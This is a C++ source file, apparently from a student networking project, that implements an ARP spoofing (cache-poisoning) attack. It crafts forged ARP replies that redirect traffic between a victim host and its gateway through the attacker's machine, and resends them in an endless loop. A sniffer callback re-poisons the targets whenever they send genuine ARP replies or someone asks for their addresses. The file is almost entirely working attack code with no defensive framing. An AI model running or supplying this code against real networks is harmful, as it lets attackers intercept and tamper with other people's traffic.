/*
 * Spoofer.cpp
 *
 *  Created on: Apr 7, 2015
 *      Author: Felipe Rodopoulos
 */

#include "Spoofer.h"

Spoofer::Spoofer() {}

Spoofer::~Spoofer() {}

void Spoofer::spoof(){
	// Poisoned frame to victim

	Crafter toVictim(Globals::iface);
	toVictim.arp(
		ARPOP_REPLY,
		Globals::attacker.mac->ether_addr_octet, Globals::gateway.ip,
		Globals::victim.mac->ether_addr_octet, Globals::victim.ip
	);
	toVictim.ethernet(
		ETHERTYPE_ARP,
		Globals::attacker.mac->ether_addr_octet,
		Globals::victim.mac->ether_addr_octet
	);

	// Poisoned frame to gateway
	Crafter toGateway(Globals::iface);
	toGateway.arp(ARPOP_REPLY, Globals::attacker.mac->ether_addr_octet, Globals::victim.ip, Globals::gateway.mac->ether_addr_octet, Globals::gateway.ip);
	toGateway.ethernet(ETHERTYPE_ARP, Globals::attacker.mac->ether_addr_octet, Globals::gateway.mac->ether_addr_octet);

	Sniffer sniffer("arp");

	// TODO Init thread
	printf("Spoofing victins\n");
	do{
		// Spoofando de novo
		toVictim.send();
		toGateway.send();
		printf("\nENVIANDO SPOOFS!\n");

		sniffer.listen(spoofBack);
	} while(true);
}

void Spoofer::spoofBack(u_char* args, const struct pcap_pkthdr* header, const unsigned char* packet) {
	pcap_t* pcapContext = (pcap_t*) args;
	Ethernet ether((unsigned char*) packet);

	if(htons(ether.ptype) == ETHERTYPE_ARP){
		ARP arp((unsigned char*) packet);

		printf("%s de %s para %s\n",
				htons(arp.arpOp) == ARPOP_REPLY ? "REPLY" : "REQUEST",
				Host::ipToString(arp.spaddr).c_str(),
				Host::ipToString(arp.tpaddr).c_str()
		);

		/* Se algumas das vitimas manda um ARP Reply valido (sem o MAC do atacante como sender) */
		if(htons(arp.arpOp) == ARPOP_REPLY){
			if((arp.spaddr == Globals::victim.ip || arp.spaddr == Globals::gateway.ip)
			   && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet,6)){
				printf ("Target: %s sent legitimate ARP packet. Spoof back...\n", Host::ipToString(arp.spaddr).c_str());
				pcap_breakloop(pcapContext);
			}

		/* Se alguem manda um ARP Request perguntando quem é uma das vítimas */
		} else if (htons(arp.arpOp) == ARPOP_REQUEST){
			if((arp.tpaddr == Globals::victim.ip || arp.tpaddr == Globals::gateway.ip)
			  && memcmp(arp.shaddr, Globals::attacker.mac->ether_addr_octet, 6)){
				printf ("Someone is asking for the MAC of one of the targets... Spoof back!\n");
				pcap_breakloop(pcapContext);
			}
		}
	}
}

void Spoofer::hexDump(const unsigned char* buf, int iByte, int lByte){
	int i, j = 1;
	printf("\nPacket hex dump (byte offset %d - %d): \n", iByte, lByte);
	for(i = iByte; i < lByte; i++){
		printf("%02x ", buf[i]);
		if(j == 4){
			j = 0;
			printf("\n");
		}
		j++;
	}
	printf("\n\n");
}
